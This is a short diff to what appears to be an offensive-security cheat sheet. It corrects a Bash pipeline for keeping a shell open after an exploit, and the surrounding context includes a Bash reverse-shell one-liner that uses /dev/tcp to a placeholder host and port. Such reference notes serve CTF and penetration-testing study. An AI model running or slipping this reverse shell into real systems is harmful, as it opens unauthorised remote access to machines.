@@ -27,7 +27,7 @@
 
 ### Bash
 
-- Maintain shell after running an exploiting: `(./exploit | cat ) | ./vuln`
+- Maintain shell after running an exploiting: `(./exploit ; cat ) | ./vuln`
 - Simple Bash revshell: 
     
       bash -i >& /dev/tcp/{HOST_IP}/{PORT} 0>&1
